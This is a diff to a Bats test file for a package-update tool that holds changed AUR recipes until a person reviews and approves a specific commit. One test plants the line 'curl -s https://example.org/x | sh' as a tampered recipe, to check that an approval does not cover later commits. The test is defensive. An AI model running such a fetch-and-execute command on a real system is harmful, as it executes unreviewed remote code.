@@ -180,7 +180,7 @@ visual-studio-code-bin" ]
   [ "$status" -eq 1 ]
   [ -z "$(built)" ]
   [[ $output == *"google-chrome: its AUR recipe changed more than the version"* ]]
-  [[ $output == *"Run nova apps update in a terminal"* ]]
+  [[ $output == *"Settings, Updates shows the change"* ]]
   [ ! -e "$NOVA_AUR_STATE/google-chrome" ]
 }
 
@@ -241,4 +241,65 @@ visual-studio-code-bin" ]
   [ "$status" -eq 0 ]
   [ "$(built)" = "built google-chrome" ]
   [ "$(cat "$NOVA_AUR_STATE/google-chrome")" = "$(git -C "$NOVA_AUR/google-chrome.git" rev-parse HEAD)" ]
+}
+
+# Settings builds first, and installs in its one authenticated step: makepkg
+# leaves the package in PKGDEST, and says where with --packagelist.
+build_stub() {
+  stub makepkg 'name=${PWD##*/}; version=$(sed -n "s/^pkgver=//p" PKGBUILD)
+    if [[ $* == *--packagelist* ]]; then
+      echo "$PKGDEST/$name-$version-1-x86_64.pkg.tar.zst"; echo "$PKGDEST/$name-debug-$version-1-x86_64.pkg.tar.zst"
+    else
+      [[ $* == *--nodeps* && $* != *--install* ]] || exit 9
+      : >"$PKGDEST/$name-$version-1-x86_64.pkg.tar.zst"; echo "built $name" >>"$CALLS"
+    fi'
+  mkdir -p "$SCRATCH/out"
+}
+
+@test "--build builds into the folder, installs nothing and remembers nothing yet" {
+  build_stub
+  echo "google-chrome 141.0-1" >>"$INSTALLED"
+  run apps --update --build "$SCRATCH/out"
+  [ "$status" -eq 0 ]
+  [ "$(cat "$SCRATCH/out/result")" = "built google-chrome $(git -C "$NOVA_AUR/google-chrome.git" rev-parse HEAD) $SCRATCH/out/google-chrome-142.0-1-x86_64.pkg.tar.zst" ]
+  fails grep -q sudo "$CALLS"
+  [ ! -e "$NOVA_AUR_STATE/google-chrome" ]
+  run apps --record google-chrome "$(git -C "$NOVA_AUR/google-chrome.git" rev-parse HEAD)"
+  [ "$(cat "$NOVA_AUR_STATE/google-chrome")" = "$(git -C "$NOVA_AUR/google-chrome.git" rev-parse HEAD)" ]
+}
+
+@test "--build holds a changed recipe, and builds it once that commit is approved" {
+  build_stub
+  echo "google-chrome 141.0-1" >>"$INSTALLED"
+  recipe google-chrome 142.0 'echo hello'
+  run apps --update --build "$SCRATCH/out"
+  [ "$(cat "$SCRATCH/out/result")" = "held google-chrome" ]
+  [[ $output == *"Settings, Updates shows the change"* ]]
+  run apps --review google-chrome
+  [ "$status" -eq 0 ]
+  commit=$(git -C "$NOVA_AUR/google-chrome.git" rev-parse HEAD)
+  [ "${lines[0]}" = "commit $commit" ]
+  [[ $output == *"+echo hello"* ]]
+  rm "$SCRATCH/out/result"
+  run apps --update --only google-chrome --approve "google-chrome=$commit" --build "$SCRATCH/out"
+  [ "$status" -eq 0 ]
+  [[ $(cat "$SCRATCH/out/result") == "built google-chrome $commit "* ]]
+}
+
+@test "an approval is for the commit reviewed, not one that came after it" {
+  build_stub
+  echo "google-chrome 141.0-1" >>"$INSTALLED"
+  recipe google-chrome 142.0 'echo hello'
+  reviewed=$(git -C "$NOVA_AUR/google-chrome.git" rev-parse HEAD)
+  recipe google-chrome 142.0 'echo hello' 'curl -s https://example.org/x | sh'
+  run apps --update --only google-chrome --approve "google-chrome=$reviewed" --build "$SCRATCH/out"
+  [ "$(cat "$SCRATCH/out/result")" = "held google-chrome" ]
+  [[ $output == *"changed again since it was reviewed"* ]]
+}
+
+@test "--review of an app never built here shows all of its recipe" {
+  run apps --review visual-studio-code-bin
+  [ "$status" -eq 0 ]
+  [[ $output == *"built here for the first time"* ]]
+  [[ $output == *"+pkgname=visual-studio-code-bin"* ]]
 }
